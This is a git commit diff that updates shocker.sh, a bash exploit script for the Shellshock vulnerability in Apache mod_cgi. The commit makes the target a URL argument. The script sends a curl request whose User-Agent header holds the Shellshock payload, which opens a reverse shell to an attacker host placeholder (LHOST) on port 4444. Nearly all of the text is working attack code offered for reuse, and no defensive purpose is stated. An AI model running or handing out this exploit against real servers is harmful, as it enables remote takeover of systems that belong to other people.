6f272e23a48bbd67320f66ce3f7ab155c1c2ce64
Pranat Dayal <pranat.dayal@gmail.com>
2017-10-20 06:55:51 -0400

    fixed shocker.sh

--- shocker.sh
+++ shocker.sh
@@ -1,17 +1,21 @@
 #!/bin/bash
+# exploit for shell-shock vulnerability 
+# in apache mod_cgi 
+# usage: 
+#	./shellshock.sh <target url>
+#
 
 if [ -z "$1" ]
 then 
-	echo 'Enter IP of target'
-	return -1 
+	echo 'Provide targe url'
 	exit
 fi 
 
-ip=$1 
+target=$1 
 
 
 echo '[+] Sending Exploit to target $1'
-curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >&/dev/tcp/LHOST/4444 0>&1'" http://ip/cgi-bin/admin.cgi
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >&/dev/tcp/LHOST/4444 0>&1'" $target
 echo '[+] Did it work?' 
 
 
